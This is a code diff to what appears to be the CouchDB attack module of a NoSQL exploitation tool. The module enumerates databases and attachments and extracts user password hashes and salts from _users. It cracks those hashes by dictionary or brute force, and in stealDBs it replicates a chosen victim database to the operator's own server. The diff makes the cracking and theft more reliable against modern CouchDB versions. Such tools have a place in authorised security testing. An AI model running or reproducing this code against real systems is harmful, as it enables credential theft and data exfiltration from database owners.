@@ -5,7 +5,11 @@
 from .exception import NoSQLMapException
 import couchdb
 import urllib.request
+import urllib.parse
+import urllib.error
 import requests
+import socket
+import subprocess
 import sys
 import unittest
 import hashlib
@@ -25,46 +29,41 @@ no_tag = ['n', 'N']
 def args():
     return []
 
+def _verLess13(ver):
+    # Robustly decide whether a CouchDB version string is < 1.3 without the old
+    # float(ver[0:3]) trick (which ValueErrors on 'v'-prefixed builds and
+    # misparses two-digit components like '0.10').
+    try:
+        parts = str(ver).lstrip("vV").split(".")
+        major = int(parts[0])
+        minor = int(parts[1]) if len(parts) > 1 else 0
+        return (major, minor) < (1, 3)
+    except (ValueError, IndexError, TypeError):
+        return False
+
 def couchScan(target,port,pingIt):
     if pingIt == True:
-        test = os.system("ping -c 1 -n -W 1 " + target + ">/dev/null")
+        # argv form (no shell) so a hostile scanned IP/hostname cannot inject
+        # shell commands onto the operator's box.
+        test = subprocess.call(["ping", "-c", "1", "-n", "-W", "1", str(target)],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if test != 0:
+            return [4, None]
 
-        if test == 0:
-            try:
-                conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
-
-                try:
-                    dbVer = conn.version()
-                    return [0,dbVer]
-
-                except couchdb.http.Unauthorized:
-                    return [1,None]
-
-                except NoSQLMapException:
-                    return [2,None]
-
-            except NoSQLMapException:
-                return [3,None]
-
-        else:
-            return [4,None]
-
-    else:
+    try:
+        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
         try:
-            conn = couchdb.Server("http://" + str(target) + ":" + str(port) +"/")
+            dbVer = conn.version()
+            return [0, dbVer]
 
-            try:
-                dbVer = conn.version()
-                return [0,dbVer]
+        except couchdb.http.Unauthorized:
+            return [1, None]
 
-            except couchdb.http.Unauthorized:
-                return [1,None]
+        except couchdb.http.HTTPError:
+            return [2, None]
 
-            except NoSQLMapException:
-                return [2,None]
-
-        except NoSQLMapException:
-            return [3,None]
+    except (socket.error, ConnectionError, OSError):
+        return [3, None]
 
 def netAttacks(target,port, myIP, args = None):
     print("DB Access attacks (CouchDB)")
@@ -86,15 +85,20 @@ def netAttacks(target,port, myIP, args = None):
             print("Login required!")
             srvUser = input("Enter server username: ")
             srvPass = input("Enter server password: ")
-            uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":" + str(port) + "/"
+            uri = "http://" + urllib.parse.quote(srvUser, safe="") + ":" + urllib.parse.quote(srvPass, safe="") + "@" + target + ":" + str(port) + "/"
 
             try:
                 conn = couchdb.Server(uri)
+                # couchdb.Server is lazy; force a request so bad creds surface here.
+                conn.version()
                 print("CouchDB authenticated on " + target + ":" + str(port))
                 mgtOpen = True
 
-            except NoSQLMapException:
+            except couchdb.http.Unauthorized:
                 input("Failed to authenticate.  Press enter to continue...")
+                return
+            except (socket.error, ConnectionError, OSError, couchdb.http.HTTPError):
+                input("Couldn't reach CouchDB.  Press enter to continue...")
                 return
 
     elif needCreds[0] == 2:
@@ -110,11 +114,11 @@ def netAttacks(target,port, myIP, args = None):
     mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
     # Future rev:  Add web management interface parsing
     try:
-        mgtRespCode = urllib.request.urlopen(mgtUrl).getcode()
+        mgtRespCode = urllib.request.urlopen(mgtUrl, timeout=5).getcode()
         if mgtRespCode == 200:
             print("Sofa web management open at " + mgtUrl + ".  No authentication required!")
 
-    except NoSQLMapException:
+    except (urllib.error.URLError, urllib.error.HTTPError, OSError):
         print("Sofa web management closed or requires authentication.")
 
     if mgtOpen == True:
@@ -149,74 +153,119 @@ def netAttacks(target,port, myIP, args = None):
 
 def getPlatInfo(couchConn, target):
     print("Server Info:")
-    print("CouchDB Version: " + couchConn.version())
+    try:
+        print("CouchDB Version: " + couchConn.version())
+    except (socket.error, OSError, couchdb.http.HTTPError) as e:
+        print("Couldn't retrieve version: " + str(e))
     return
 
 
 def enumAtt(conn, target, port):
-    dbList = []
     print("Enumerating all attachments...")
+    try:
+        dbList = [db for db in conn]
+    except (socket.error, OSError, couchdb.http.HTTPError) as e:
+        print("Couldn't list databases: " + str(e))
+        return
 
-    for db in conn:
-        dbList.append(db)
-
+    found = False
     for dbName in dbList:
-        r = requests.get("http://" + target + ":" + str(port) + "/" + dbName + "/_all_docs" )
-        dbDict = r.json()
+        try:
+            r = requests.get("http://" + target + ":" + str(port) + "/" + dbName + "/_all_docs",
+                             params={"include_docs": "true"}, timeout=10)
+            rows = r.json().get("rows", [])
+        except (requests.RequestException, ValueError) as e:
+            print("  " + dbName + ": error (" + str(e) + ")")
+            continue
+
+        for row in rows:
+            doc = row.get("doc") or {}
+            for name, meta in (doc.get("_attachments", {}) or {}).items():
+                found = True
+                meta = meta or {}
+                print("  " + dbName + "/" + str(doc.get("_id", "?")) + " -> " + name +
+                      " (" + str(meta.get("length", "?")) + " bytes, " + str(meta.get("content_type", "")) + ")")
+
+    if not found:
+        print("No attachments found.")
+    return
 
 
 
 def enumDbs (couchConn,target,port):
     dbList = []
-    userNames = []
-    userHashes = []
-    userSalts = []
     try:
-            for db in couchConn:
-                 dbList.append(db)
+        for db in couchConn:
+            dbList.append(db)
 
+        print("List of databases:")
+        print("\n".join(dbList))
+        print("\n")
 
-            print("List of databases:")
-            print("\n".join(dbList))
-            print("\n")
+    except (socket.error, OSError, couchdb.http.HTTPError):
+        print("Error:  Couldn't list databases.  The provided credentials may not have rights.")
 
-    except NoSQLMapException:
-            print("Error:  Couldn't list databases.  The provided credentials may not have rights.")
+    if '_users' not in dbList:
+        return
 
-    if '_users' in dbList:
-        r = requests.get("http://" + target + ":" + str(port) + "/_users/_all_docs?startkey=\"org.couchdb.user\"&include_docs=true")
-        userDict = r.json()
+    # Bound the query so it does not walk past the user docs into _design/_auth,
+    # and tolerate a partial / non-JSON response instead of crashing.
+    try:
+        r = requests.get("http://" + target + ":" + str(port) + "/_users/_all_docs",
+                         params={"startkey": '"org.couchdb.user:"',
+                                 "endkey": '"org.couchdb.user;"',
+                                 "include_docs": "true"},
+                         timeout=10)
+        rows = r.json().get("rows", [])
+    except (requests.RequestException, ValueError) as e:
+        print("Couldn't read _users: " + str(e))
+        return
 
-        for counter in range (0,int(userDict["total_rows"])-int(userDict["offset"])):
-            if float(couchConn.version()[0:3]) < 1.3:
-                userNames.append(userDict["rows"][counter]["id"].split(":")[1])
-                userHashes.append(userDict["rows"][counter]["doc"]["password_sha"])
-                userSalts.append(userDict["rows"][counter]["doc"]["salt"])
+    try:
+        dbVer = couchConn.version()
+    except (socket.error, OSError, couchdb.http.HTTPError):
+        dbVer = ""
+    legacy = _verLess13(dbVer)
 
-            else:
-                userNames.append(userDict["rows"][counter]["id"].split(":")[1])
-                userHashes.append(userDict["rows"][counter]["doc"]["derived_key"])
-                userSalts.append(userDict["rows"][counter]["doc"]["salt"])
+    users = []
+    for row in rows:
+        doc = row.get("doc")
+        rid = row.get("id", "")
+        if not doc or ":" not in rid:
+            continue  # skip _design/_auth and malformed rows
+        name = rid.split(":", 1)[1]
+        salt = doc.get("salt", "")
+        if legacy:
+            h = doc.get("password_sha")
+            iters = None
+        else:
+            h = doc.get("derived_key")
+            iters = int(doc.get("iterations", 10))
+        if h is None:
+            continue
+        users.append((name, h, salt, iters))
 
-        print("Database Users and Password Hashes:")
+    if not users:
+        print("No crackable user documents found in _users.")
+        return
 
-        for x in range(0,len(userNames)):
-            print("Username: " + userNames[x])
-            print("Hash: " + userHashes[x])
-            print("Salt: "+ userSalts[x])
-            print("\n")
+    print("Database Users and Password Hashes:")
+    for name, h, salt, iters in users:
+        print("Username: " + name)
+        print("Hash: " + h)
+        print("Salt: " + salt)
+        if iters is not None:
+            print("Iterations: " + str(iters))
+        print("\n")
 
-            crack = input("Crack this hash (y/n)? ")
-
-            if crack in yes_tag:
-                passCrack(userNames[x],userHashes[x],userSalts[x],couchConn.version())
-
+        crack = input("Crack this hash (y/n)? ")
+        if crack in yes_tag:
+            passCrack(name, h, salt, iters, dbVer)
 
     return
 
 
 def stealDBs (myDB,couchConn,target,port):
-    dbLoot = True
     menuItem = 1
     dbList = []
 
@@ -231,20 +280,18 @@ def stealDBs (myDB,couchConn,target,port):
         print(str(menuItem) + "-" + dbName)
         menuItem += 1
 
-    while dbLoot:
+    while True:
         dbLoot = input("Select a database to steal:")
-
-        if int(dbLoot) > menuItem:
-            print("Invalid selection.")
-
-        else:
+        if dbLoot.isdigit() and 1 <= int(dbLoot) < menuItem:
             break
+        print("Invalid selection.")
 
     try:
         # Create the DB target first
         myServer = couchdb.Server("http://" + myDB + ":5984")
-        targetDB = myServer.create(dbList[int(dbLoot)-1] + "_stolen")
-        couchConn.replicate(dbList[int(dbLoot)-1],"http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen")
+        srcName = dbList[int(dbLoot)-1]
+        myServer.create(srcName + "_stolen")
+        couchConn.replicate(srcName, "http://" + myDB + ":5984/" + srcName + "_stolen")
 
         cloneAnother = input("Database cloned.  Copy another (y/n)? ")
 
@@ -254,12 +301,12 @@ def stealDBs (myDB,couchConn,target,port):
         else:
             return
 
-    except NoSQLMapException:
-        input("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
+    except (socket.error, OSError, couchdb.http.HTTPError) as e:
+        input("Something went wrong (" + str(e) + ").  Are you sure your CouchDB is running and options are set? Press enter to return...")
         return
 
 
-def passCrack (user, encPass, salt, dbVer):
+def passCrack (user, encPass, salt, iterations, dbVer):
     select = True
     print("Select password cracking method: ")
     print("1-Dictionary Attack")
@@ -271,11 +318,11 @@ def passCrack (user, encPass, salt, dbVer):
 
             if select == "1":
                 select = False
-                dict_pass(encPass,salt,dbVer)
+                dict_pass(encPass, salt, iterations, dbVer)
 
             elif select == "2":
                     select = False
-                    brute_pass(encPass,salt,dbVer)
+                    brute_pass(encPass, salt, iterations, dbVer)
 
             elif select == "3":
                     return
@@ -286,8 +333,16 @@ def genBrute(chars, maxLen):
     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))
 
 
-def brute_pass(hashVal,salt,dbVer):
-    charSel = True
+def _couchMatch(passw, salt, iterations, hashVal, dbVer):
+    # CouchDB hashing changed in v1.3: pre-1.3 = salted SHA1, 1.3+ = PBKDF2-SHA1
+    # with the per-user iteration count (the old code hardcoded 10, so cracking
+    # silently failed against every modern install whose count differs).
+    if _verLess13(dbVer):
+        return gen_pass_couch(passw, salt, hashVal)
+    return gen_pass_couch13(passw, salt, int(iterations or 10), hashVal)
+
+
+def brute_pass(hashVal, salt, iterations, dbVer):
     print("\n")
     maxLen = input("Enter the maximum password length to attempt: ")
     print("1-Lower case letters")
@@ -316,24 +371,25 @@ def brute_pass(hashVal,salt,dbVer):
     elif charSel == "6":
         chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
 
+    else:
+        print("Invalid character set selection.")
+        return
+
+    if not maxLen.isdigit():
+        print("Maximum length must be a number.")
+        return
+
     count = 0
     print("\n", end="")
 
     for attempt in genBrute (chainSet,int(maxLen)):
-        print("\rCombinations tested: " + str(count) + "\r")
+        print("\rCombinations tested: " + str(count), end="")
         count += 1
-
-        # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
-        if float(dbVer[0:3]) < 1.3:
-            gotIt = gen_pass_couch(attempt,salt,hashVal)
-        else:
-            gotIt = gen_pass_couch13(attempt, salt, 10, hashVal)
-
-        if gotIt == True:
-                break
+        if _couchMatch(attempt, salt, iterations, hashVal, dbVer):
+            break
 
 
-def dict_pass(key,salt,dbVer):
+def dict_pass(key, salt, iterations, dbVer):
     loadCheck = False
 
     while loadCheck == False:
@@ -344,21 +400,14 @@ def dict_pass(key,salt,dbVer):
                 passList = f.readlines()
                 loadCheck = True
 
-        except NoSQLMapException:
+        except OSError:
             print(" Couldn't load file.")
 
     print("Running dictionary attack...")
 
     for passGuess in passList:
-        temp = passGuess.split("\n")[0]
-
-        # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
-        if float(dbVer[0:3]) < 1.3:
-            gotIt = gen_pass_couch(temp,salt,key)
-        else:
-            gotIt = gen_pass_couch13(temp, salt, 10, key)
-
-        if gotIt == True:
+        temp = passGuess.rstrip("\n")
+        if _couchMatch(temp, salt, iterations, key, dbVer):
             break
 
     return
